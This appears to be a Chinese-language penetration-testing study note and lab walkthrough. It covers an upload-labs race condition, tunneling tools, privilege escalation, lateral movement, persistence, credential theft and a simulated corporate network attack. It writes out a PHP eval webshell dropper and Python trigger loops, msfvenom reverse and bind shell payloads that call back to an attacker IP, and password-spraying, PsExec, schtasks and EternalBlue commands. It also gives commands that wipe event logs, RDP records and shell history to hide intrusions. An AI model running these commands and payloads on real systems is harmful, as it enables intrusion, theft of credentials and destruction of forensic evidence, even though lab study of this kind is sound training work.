![image-20241108115610339](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108115610339.png)

![image-20241108120026505](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108120026505.png)

![image-20241108115626450](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108115626450.png)

##### 蚁剑连接

通过antSword工具去连接

```bash
http://192.168.70.10/upload-labs/include.php?file=upload/1720.gif
xxx
```

![image-20241108120055333](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108120055333.png)

![image-20241108120115713](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108120115713.png)



#### PASS-18 条件竞争

代码中，首先将文件保存到路径中，然后进行类型判断，如果没在类型中，就将其删除

![image-20241102132612734](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241102132612734.png)

```bash
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
  $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
  rename($upload_file, $img_path);
  $is_upload = true;
        }else{
 $msg = "只允许上传.jpg|.png|.gif类型文件！";
 unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}

```

##### 条件竞争

程序执行是有时间的，当文件传上去的瞬间，**利用时间差**，

当程序还在判断类型的时候，我们去访问上传文件（有恶意代码），这时候就执行成功了，这就叫做**条件竞争**

当然手动触发是不可能的，因为手动速度太慢了，根本不可能做到，这时候就需要写脚本了

##### create.php

要上传的文件

作用：生成木马文件

```bash
<?php fputs(fopen( 'xxx.php' , 'w' ),'<?php @eval($_POST[ "xxx"])?>');?>
```

##### create.py

python不停访问上传文件

作用：触发php代码执行

```bash
import requests

url = "http://192.168.70.10/upload-labs/upload/create.php"

while True:
		requests.get(url)
```

![image-20241108140459432](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108140459432.png)

##### request.py

python不断请求被生成文，直到请求成功

作用：验证木马文件是否被创建成功

```bash
import requests

url = "http://192.168.70.10/upload-labs/upload/xxx.php"

while True:
	response = requests.get(url)
	if response.status_code == 200:
		 print("ok")
		 break
```

![image-20241108140542496](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108140542496.png)

##### 1.burpsuite不断地上传文件：

###### burp抓包放到intruder模块

上传文件，使用burp的代理，截获http消息

![image-20241108135327815](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108135327815.png)

然后将消息放到`intruder`模块

![image-20241108135414954](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108135414954.png)

###### 一直发送


![image-20241108135504322](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108135504322.png)

![image-20241108135530708](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108135530708.png)

##### 2.python 对上传的文件进行请求

然后使用python程序，一直对我们上传的文件进行请求，只要请求成功，就会得到**200**的响应，

也就是**上传的文件成功被执行**了，`xxx.php`已经被生成

```python
import requests

weburl= "http://192.168.70.10/upload-labs"
url = weburl + "/upload/create.php"
url2= weburl + "/upload/xxx.php"

while True:
	html = requests.get(url)
	response = requests.get(url2)
	if response.status_code == 200:
		print("ok")
		break
```

![image-20241108141417020](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108141417020.png)

##### 蚁剑连接

```bash
http://192.168.70.10/upload-labs/upload/xxx.php
xxx
```

![image-20241108140840176](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108140840176.png)

![image-20241108140907861](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241108140907861.png)

# 靶场练习

## 01.隧道代理

### 隧道代理介绍

拿到某个网络主机的权限，无法将流量或权限发送出来

#### 代理

- 
  网络之间的通讯，如两个不同的内网，内网和外网和之间

- 访问一些平时不能访问的站点以及某个单位或团体内部资源
- 隐藏真实IP

![image-20241109085846718](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109085846718.png)

#### 正向代理

客户端的请求都经由代理端转发至服务端

#### 反向代理

客户端的请求会直接发给代理服务器，代理服务器会转发至服务端并将服务端响应返回值客户端

#### 隧道

解决流量不出网，利用可出网的协议封装，实现穿越防火墙，常用的如DNS、socks、HTTP、ICMP等

### proxifier

proxifier代理客户端软件

https://www.proxifier.com/

![image-20241109085936411](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109085936411.png)

![image-20241109085958906](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109085958906.png)

### reGeorg

https://github.com/sensepost/reGeorg

HTTP协议建立通信隧道，通过上传该工具创建socket监听一个端口用于正向代理

根据使用的类型上传，直接上传相应文件，返回图示信息说明脚本可正常运行

![image-20241109090052859](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109090052859.png)


    python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口) -l(本地地址)

### frp

https://github.com/fatedier/frp

- frp有一个客户端和一个服务器端
- frpc是客户端，frps是服务端；frpc.ini和frps.ini分别对应客户端和服务器端的配置文件
-  客户端配置端口后上传到目标服务器
- 服务端更改配置文件中的server_addr为自己的公网服务器地址后上传到自己的公网服务器上
- 将公网服务器上的两个端口开放
- 然后在两台机器上在执行以下命令即可
- `frps -c ./frps.ini`
- `frpc -c ./frpc.ini`

![image-20241109095239027](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109095239027.png)

### 其他工具

####  SeaMoon

https://github.com/DVKunion/SeaMoon

 一个基于 Serverless 的网络工具集，包括代理、转发、隧道等等常见网络功能

####  Stowaway

https://github.com/ph4ntonn/Stowaway

 多级代理工具，用户可使用此程序将外部流量通过多个节点代理至内网，构造树状节点网络，并轻松实现管理功能

####  pingtunnel

https://github.com/esrrhs/pingtunnel

 ICMP隧道代理工具

####  EarthWorm

https://github.com/idlefire/ew

 开启 SOCKS v5 代理服务的工具

## 02.后渗透

### 权限提升

#### 权限提升

- 
   利用系统的漏洞：通过获取到的系统使用的软件版本和补丁信息，查找或利用已知和未知的漏洞

-  利用错误配置漏洞
-  利用第三方软件漏洞，如MySQL
-  密码破解：通过获取到的其他用户凭据，如用户名和密码，获得更高的权限

#### Windows的权限可分为四种

| User                 | 普通用户权限                                                 |
| -------------------- | ------------------------------------------------------------ |
| Administrator        | 管理员权限                                                   |
| System               | 系统权限                                                     |
| TrustedInstallerTrus | Windows中的最高权限，默认情况下不开启,可对防火墙修改文件位置 C:\Windows\servicing |

####   Windows提权

上传webshell后可以执行下面命令，查看系统安装的补丁

```bash
systeminfo
wmic qfe get caption,description,hotfixid,installedon
wmic qfe get Description,HotFixID,InstalledOn | findstr /C:"KB4346084" /C:"KB4509094"
wmic product get name,version
```

根据未列出的补丁号找相应的EXP进行提权

##### windows-kernel-exploits

`windows-kernel-exploits` 是Windows平台提权漏洞集合，包括相应的补丁号

https://github.com/SecWiki/windows-kernel-exploits

- 下载后首先更新漏洞信息，会生成一个xls文件：

```bash
python2 windows-exploit-suggester.py --update
```

- 保存目标系统的补丁信息：

```bash
systeminfo>sysinfo.txt
```

- 查询是否存在可利用漏洞：

```bash
python2 windows-exploit-suggester.py -d xxx.xls -i sysinfo.txt
```

#####   Sherlock

Sherlock 可以快速的查找出可能用于本地权限提升的漏洞

https://github.com/rasta-mouse/Sherlock

##### wesng 

wesng 扫描Windows漏洞

https://github.com/bitsadmin/wesng

##### Metasploit

- local_exploit_suggester 模块：快速识别系统中可被利用的漏洞
- enum_patches 模块
- service_premiossions 模块：利用系统服务权限配置错误
- always_install_elevated 模块：利用注册表键 
- trusted_service_path模块：可信任路径漏洞

#####  计划任务

```bash
 Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike "\Microsoft\Windows\*") -And ($_.Principal.UserId -
 notlike "*$env:UserName*")} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, 
 @{Name="User";Expression={$_.Principal.userID}} 
```

 查看目录的权限配置情况

```bash
accesschk64.exe -dqv "/path/to/dir"
```

##### 土豆

###### Rotten Potato

通过DCOM call来使服务向攻击者监听的端口发起连接并进行NTLM认证，需要SelmpersonatePrivilege权限

https://github.com/foxglovesec/RottenPotato

###### PrintSpoofer

利用spoolsv.exe进程的RPC服务器强制Windows主机向其他计算机进行身份验证，需要SelmpersonatePrivilege、SeAssignPrimaryToken权限

https://github.com/itm4n/PrintSpoofer

###### GodPotato

在Windows Server 2012 - Windows Server 2022，Windows8 - Windows 11中实现提权，

WEB服务和数据库服务需要“`ImpersonatePrivilege`”权限

https://github.com/BeichenDream/GodPotato

###### juicy-potato

RottenPotatoNG的增强版，需要支持SeImpersonate或者SeAssignPrimaryToken权限

https://github.com/ohpe/juicy-potato

> ###### 查看是否有相应权限
>
> - msf 获得session后可执行 getprivs
> - 在目标服务器执行以下命令
>
> ```bash
> whoami /all
> whoami /priv
> ```



##### 数据库提权

利用数据库函数或执行SQL语句提升服务器用户权限

###### MDUT

若有数据库的账号和密码可以直接使用 `MDUT` 连接进行提权测试

https://github.com/SafeGroceryStore/MDUT

连接进行提权测试

![image-20241109091946878](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109091946878.png)

###### Databasetools

`Databasetools` Go语言编写的数据库自动化提权工具，支持Mysql、MSSQL、Postgresql、Oracle、Redis数据库提权、命令执行、爆破以及ssh连接

https://github.com/Hel10-Web/Databasetools

#### Linux提权

Linux的文件和目录有三组权限：所有者、组、其他用户，所有文件和目录都有一个所有者和一个组

文件和目录的权限：读 r 4，写 w 2，执行 x 1

特殊权限：SUID是文件使用文件所有者的权限执行；SGID若设置在文件上时，文件将使用文件组的权限执行，设置在目录上时，该目录内创建的文件将继承目录本身的组

##### traitor

traitor 利用本地错误配置和漏洞提升权限

https://github.com/liamg/traitor

##### linux-exploit-suggester-2 和 Linux_Exploit_Suggester 

linux-exploit-suggester-2 和 Linux_Exploit_Suggester 查找内核漏洞

https://github.com/jondonas/linux-exploit-suggester-2?tab=readme-ov-file

https://github.com/InteliSecureLabs/Linux_Exploit_Suggester

##### LinEnum

LinEnum 使用脚本检查Linux文件，如操作系统相关信息、用户和组、权限认证、文件及服务配置等信息

https://github.com/rebootuser/LinEnum

##### linuxprivchecker

linuxprivchecker 枚举系统信息并搜索常见的可以进行权限提升的漏洞利用，如明文密码，错误配置

https://github.com/sleventyeleven/linuxprivchecker

![image-20241109092235970](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109092235970.png)

![image-20241109092246466](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109092246466.png)

##### 其他提权工具

###### Kernelhub

利用系统内核漏洞进行提权

https://github.com/Ascotbe/Kernelhub

###### PEASS-ng

适用于 Windows 和 Linux/Unix 和 MacOS 的权限提升工具，

对系统信息、用户信息、进程信息、服务信息、网络信息、Windows凭据浏览器信息等

https://github.com/peass-ng/PEASS-ng

![image-20241109092404659](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109092404659.png)

添加注册表信息，输出内容可以高亮显示

```bash
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

上传到目标机器后执行 `winPEASx64.exe` 即可

### 横向移动

扩大渗透范围

#### impacket 

处理多种网络协议的python类

https://github.com/fortra/impacket

#### impacket-examples-windows 

impacket示例中编译的工具集

https://github.com/maaaaz/impacket-examples-windows

#### NetExec 

自动化网络安全评估与漏洞测试工具，支持多种协议

https://github.com/Pennyw0rth/NetExec

1. SMB协议
2. LDAP协议
3. WinRM协议
4. MSSQL协议
5. SSH协议
6. FTP协议
7. RDP协议

##### 密码爆破喷洒

```bash
netexec <protocol> <target(s)> -u username1 -p password1 password2
netexec <protocol> <target(s)> -u username1 username2 -p password1
netexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce
netexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords --no-bruteforce
```

#### linWinPwn

https://github.com/lefayjey/linWinPwn

自动执行许多 `Active Directory` 枚举和漏洞检查，基于impacket、bloodhound、netexec等工具

#### pstools

https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools

### 权限维持

#### Windows

##### ShadowUser

ShadowUser 创建克隆影子账户

https://github.com/An0nySec/ShadowUser

##### SchTask_0x727

SchTask_0x727 创建隐藏计划任务，权限维持，Bypass AV

https://github.com/0x727/SchTask_0x727

####  Linux

##### HackerPermKeeper

https://github.com/RuoJi6/HackerPermKeeper

### 凭据获取

####  凭据信息

 凭据信息通常是指用于身份验证和授权的各种信息，包括用户名、密码、令牌等

利用获取的凭据信息进一步获取密码

#### 凭据信息内容

-   Windows系统密码

-   NTLM Hash

-   浏览器保存的密码，cookie

-   远程桌面连接

-   $IPC共享连接密码

-   WiFi密码

-   内部账号，如VPN

-   网站源码、数据库文件

-   工具的密码信息，如VNC、xshell、navicat     

-  ...

#### Windows凭据信息

凭据信息通常是指用于身份验证和授权的各种信息，包括用户名、密码、令牌等

利用获取的凭据信息进一步获取密码

#####  凭据信息

- 
   mimikatz

-  DumpHash
-  SharpDecryptPwd
-  LaZagne
-  searchall
-  HackBrowserData

### 痕迹清理

- 
   避免对目标系统造成不必要的干扰或风险

-  减少被发现的风险和溯源
-  隐藏攻击手段

> 是否需要清理-->梳理清理内容-->清理痕迹

#### Windows 日志信息

![image-20241109100436980](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109100436980.png)

```bash
#系统日志
##记录操作系统产生的事件，如系统进程崩溃信息等
%SystemRoot%\System32\Winevt\Logs\System.evtx

#程序日志    
##应用程序软件的相关事件，如错误、警告等信息
%SystemRoot%\System32\Winevt\Logs\Application.evtx

#安全日志
##安全相关事件，如用户权限变更、登陆、注销等
%SystemRoot%\System32\Winevt\Logs\Security.evtx

#日志所在注册表
HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog
```

##### Wevtutil 工具

   进入meterpreter后直接执行clearev

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848%28v=ws.11%29

##### 事件查看器

删除事件查看器的日志，但是这个也是系统事件，所以会被记录

打开事件查看器：`WIN+R`，输入`eventvwr`

![image-20241109093925734](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109093925734.png)

![image-20241109100512477](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109100512477.png)

```bash
#清除事件日志
PowerShell -Command "& {Clear-Eventlog -Log Application,System,Security}" 
Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname}

#停止事件日志服务进程
Phant0m，如EventLog 服务、日志相关的svchost.exe进程
https://github.com/hlldz/Phant0m

#删除日志目录下的相应文件
日志目录 %SystemRoot%\System32\Winevt\Logs\

#删除日志相关注册表
reg query "HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog\" 
reg delete "HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog\System" /f 
```

#### Windows 远程桌面记录

![image-20241109100545149](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109100545149.png)

```bash
#Default.rdp 文件
cd %userprofile%\documents\ 	#Default.rdp所在路径：
attrib Default.rdp -s -h		#更改文件属性（系统文件属性S，隐藏文件属性H） ：
del Default.rdp					#删除文件：

#注册表
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /f /v MRU0

#跳板机的清理
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" 
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\192.168.1.15" /f
```

#### Windows 近期使用记录

```bash
#网页记录         
C:\Users\Administrator\AppData\Local\Microsoft\Windows\History

#文件记录         
C:\Users\Administrator\Recent
```

#### Linux SSH登陆记录

```bash
#w、who、last等无法检测
ssh -T user@@127.0.0.1 /bin/bash -i 

#不记录ssh公钥在本地.ssh目录中
ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
```

#### Linux history历史记录

```bash
history -c       删除内存中的所有命令历史
history -r       删除当前会话历史记录
set +o history 	当前shell内的命令不再进入日志中
set -o history   命令不会被记录到历史中

#不留下 .bash_history	
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTLOG
export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0
```

####  Linux 日志文件

```bash
/var/run/utmp       #记录现在登入的用户 
/var/log/wtmp       #记录用户所有的登入和登出
/var/log/lastlog    #记录每一个用户最后登入时间 
/var/log/btmp       #记录错误的登入尝试 
/var/log/auth.log   #需要身份确认的操作 
/var/log/secure     #记录安全相关的日志信息 
/var/log/maillog    #记录邮件相关的日志信息 
/var/log/message    #记录系统启动后的信息和错误日志 
/var/log/cron       #记录定时任务相关的日志信息 
/var/log/spooler    #记录UUCP和news设备相关的日志信息 
/var/log/boot.log   #记录守护进程启动和停止相关的日志消息
```



```bash
#覆盖日志文件【特征明显，容易被察觉】
cat /dev/null > filename

#sed全局替代
sed -i‘s/old/new/g’ file

#sed删除匹配的字段
sed -i ‘/content/’d file
```

## 03.靶场练习

###   网络拓扑

![image-20241109094830314](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109094830314-1731116912199-1.png)

| 名称       | 系统              | IP                         | 密码                                         |
| ---------- | ----------------- | -------------------------- | -------------------------------------------- |
| OA         | WindowsServer2012 | 192.168.1.85;10.10.20.128  | Administrator / WER=dfg                      |
| 工程师站   | Windows10         | 10.10.20.129;192.168.3.158 | Administrator / 123456<br>admin/123QWEasd!@# |
| 内网服务器 | WindowsServer2008 | 192.168.3.115              | Administrator / WER=dfg                      |

#### 用户名密码 

```bash
##WindowsServer2012：
Administrator / WER=dfg
TODA：admin / Admin@123

#Windows10
Administrator / 123456
admin / 123QWEasd!@#

#WindowsServer2008：
Administrator / WER=dfg
```

### 虚拟机下载

https://www.alipan.com/s/8WA85GKVJXC

提取码: `ufz1`

### 网卡

![image-20241109141539455](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109141539455.png)

#### win2012

> 192.168.1.85
>
> 10.10.20.128

![image-20241109144056024](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109144056024.png)

#### win10

> 10.10.20.129
>
> 192.168.3.158

![image-20241109144947228](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109144947228.png)

#### win2008

> 192.168.3.115

![image-20241109165659041](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109165659041.png)

### 防火墙

关闭防火墙和实时防护

### 整体思路

#### Windows Server2012R2

##### nmap端口扫描

![image-20241111075511142](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111075511142.png)

##### TDOA

TDOA_RCE

https://github.com/xinyu2428/TDOA_RCE

![image-20241111075533416](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111075533416.png)

##### 蚁剑连接

![image-20241111075636833](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111075636833.png)

##### 信息收集

![image-20241111075647198](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111075647198.png)

##### 开启远程桌面

在虚拟终端执行命令，开启远程桌面

```bash
开启3389端口远程桌面
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t
REG_DWORD /d 00000000 /f
关闭3389端口
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t
REG_DWORD /d 11111111 /f

```

###### 更改当前账户密码并激活

```bash
更改账户密码：net user Administrator new_pass
激活账户密码：net user Administrator /active:yes
```

###### 也可以添加新用户

```bash
net user 用户名 密码 /add
```

使用更改后的密码即可成功远程

##### 上线CS

1. 在服务端执行：`bash teamserver <IP> <Pass>`
2. 在客户端执行：`bash cobaltstrike.sh`

这里的服务端和客户端均在kali中，所以设置IP为kali的IP地址，端口为服务端执行返回的端口，密码为服务端执行设置的密码

![image-20241111080321336](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111080321336.png)

![image-20241111080311199](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111080311199.png)

![image-20241111080348647](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111080348647.png)

##### **上线** msf

###### 生成木马

msf生成反弹shell，上传到服务器中

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=4444 -f exe > 文件位置
```

![image-20241111080412390](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111080412390.png)

###### 开启监听

![image-20241111080429424](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111080429424.png)

![image-20241111080446106](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111080446106.png)

###### 信息收集

```bash
ipconfig
arp -a
```

![image-20241111080503015](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111080503015.png)

###### 添加路由

```bash
run autoroute -s 192.168.152.0/24
```

![image-20241111080520309](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111080520309.png)

###### 端口扫描

```bash
background
use auxiliary/scanner/portscan/tcp
set rhost 192.168.152.170
run
```

![image-20241111080844819](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111080844819.png)

##### 横向移动

###### 连接IPC

```bash
net use \\192.168.152.170\c$ /u:"Administrator" "123456"
```

###### 上传PsExec64.exe到winserver2012

```bash
执行单条命令输出
PsExec64.exe -accepteula \\192.168.152.170 -s cmd.exe /c "whoami"
```

![image-20241111081153664](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111081153664.png)

###### 生成正向后门

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f exe > /home/kali/Desktop/paylaod2.exe
```

###### 利用文件共享上传到win10

```bash
copy payload2.exe \\192.168.152.170\c$\payload2.exe
```

###### 执行

```bash
PsExec64.exe -accepteula \\192.168.152.170 -u administrator -p 123456 -c paylaod2.exe -d
```

###### psexec模块

使用msf的psexec模块，配置rhost、smb的账户密码的paylaod

```bash
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/bind_tcp
set rhost 192.168.152.170	#win10的IP地地址
set smbuser Administrator	#win10的IPC账户密码
set smbpass 123456
```

![image-20241111081724180](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111081724180.png)

#### Windows10

##### 信息收集

```bash
ipconfig
arp -a
```

![image-20241111081803578](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111081803578.png)

#### Windows Server2008

##### ms17_010

###### 扫描

使用模块设置rhost

```bash
use auxiliary/scanner/smb/smb_ms17_010
set rhost 192.168.141.129
run
```

###### 利用

```bash
use exploit/windows/smb/ms17_010_eternalblue
set rhost 192.168.141.129
run
```

![image-20241111082108029](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241111082108029.png)

### win2012 信息收集

#### nmap扫描

```bash
nmap 192.168.1.85
```

![image-20241109150134539](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109150134539.png)

```bash
┌──(root㉿kali)-[~]
└─# nmap 192.168.1.85                                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 15:00 CST
Nmap scan report for 192.168.1.85 (192.168.1.85)
Host is up (0.0014s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
8000/tcp  open  http-alt
8001/tcp  open  vcom-tunnel
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
MAC Address: 00:0C:29:34:AE:0B (VMware)
```

#### 访问

http://192.168.1.85:8001

![image-20241109150307264](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109150307264.png)



### TODA漏扫工具

#### TDOA_RCE

https://github.com/xinyu2428/TDOA_RCE

```bash
/root/tools/TDOA
git clone https://github.com/xinyu2428/TDOA_RCE.git
```

#### TongdaOATool

https://github.com/xiaokp7/TongdaOATool

![image-20241109151802237](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109151802237.png)

![image-20241109151700789](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109151700789.png)

```bash
[+]http://192.168.1.85:8001/存在通达OA share身份认证绕过漏洞(Tongda_Share_Bypassauth)
[+]http://192.168.1.85:8001/存在通达OA td_listview XSS跨站脚本攻击漏洞(Tongda_TdListview_XSS)
[+]http://192.168.1.85:8001/存在通达OA down信息泄露漏洞(Tongda_Down_Info)
[+]http://192.168.1.85:8001/存在通达OA get_datas前台SQL注入漏洞(Tongda_Getdatas_SqlInjection)
[+]http://192.168.1.85:8001/存在通达OA query前台SQL注入漏洞(Tongda_Query_SqlInjection)
[+]http://192.168.1.85:8001/存在通达OA report_bi前台SQL注入漏洞(Tongda_Getdatas_SqlInjection)
[+]http://192.168.1.85:8001/存在通达OA share前台SQL注入漏洞(Tongda_Share_SqlInjection)
[+]http://192.168.1.85:8001/存在通达OA retrieve_pwd存在前台SQL注入漏洞
[+]http://192.168.1.85:8001/存在通达OA action前台任意文件上传漏洞(Tongda_Action_AnyFileUpload)
[+]http://192.168.1.85:8001/存在通达OA api.pli前台任意文件上传漏洞(Tongda_ApiAli_AnyFileUpload)
[+]http://192.168.1.85:8001/存在通达OA action_crawler存在前台任意文件上传漏洞(Tongda_ActionCrawler_AnyFileUpload)
[+]http://192.168.1.85:8001/存在通达OA print前台任意文件删除&getshell(Tongda_Print_AnyFileDelete)
[+]http://192.168.1.85:8001/存在通达OA utils后台任意文件上传漏洞(Tongda_Utils_AnyFileUpload)
```

###### 文件上传

![image-20241109152109970](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109152109970.png)

### 蚁剑连接

```bash
[+]http://192.168.1.85:8001/存在通达OA utils后台任意文件上传漏洞(Tongda_Utils_AnyFileUpload)
蚁剑:http://192.168.1.85:8001//_1324054.php
密码:@xiaokp7
编码器:base64
```

![image-20241109152329628](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109152329628.png)

![image-20241109152342724](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109152342724.png)

#### 开启3389端口远程桌面

https://blog.csdn.net/2401_84466229/article/details/140961318

> 需要管理员权限开启

```bash
netstat -ano | findstr 3389

#开启3389端口远程桌面
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
#关闭3389端口
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
```

![image-20241109152921268](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109152921268.png)

![image-20241109154325905](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109154325905.png)

![image-20241109153929281](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109153929281.png)

远程桌面开启了。但是连不上

#### 上传fscan

![image-20241109161311453](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109161311453.png)

##### 运行fscan扫描内网

```bash
ipconfig
fscan.exe -h 10.10.20.0/24 > 1.txt
```

> 192.168.1.85
>
> 10.10.20.128

![image-20241109161449944](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109161449944.png)

![image-20241109161553186](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109161553186.png)

![image-20241109162000269](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109162000269.png)

> 扫到win10
>
> 10.10.20.129
>
> 192.168.3.158

##### smb爆破

```bash
fscan.exe -h 10.10.20.129 -m smb -user administrator > 2.txt 
```

![image-20241109162638286](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109162638286.png)

![image-20241109162700953](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109162700953.png)

> [+] SMB 10.10.20.129:445: administrator 123456

##### ipc$连接

```bash
net use \\10.10.20.129\ipc$ "123456" /user:"administrator"
dir \\10.10.20.129\c$

copy c:\win_4444.exe \\10.10.20.129\c$

schtasks /create /s 10.10.20.129 /u administrator /p 123456 /tn test /tr c:/win_4444.exe /sc onstart /RU System /F
schtasks /run /s 10.10.20.129 /u administrator /p 123456 /tn test
```

![image-20241109163951928](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109163951928.png)

webshell下无法建立连接

### 上传CS码

![image-20241109171718156](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109171718156.png)

![image-20241109171744092](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109171744092.png)

![image-20241109171803340](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109171803340.png)

![image-20241109172758648](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109172758648.png)

#### 进程迁移

![image-20241109174247070](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109174247070.png)

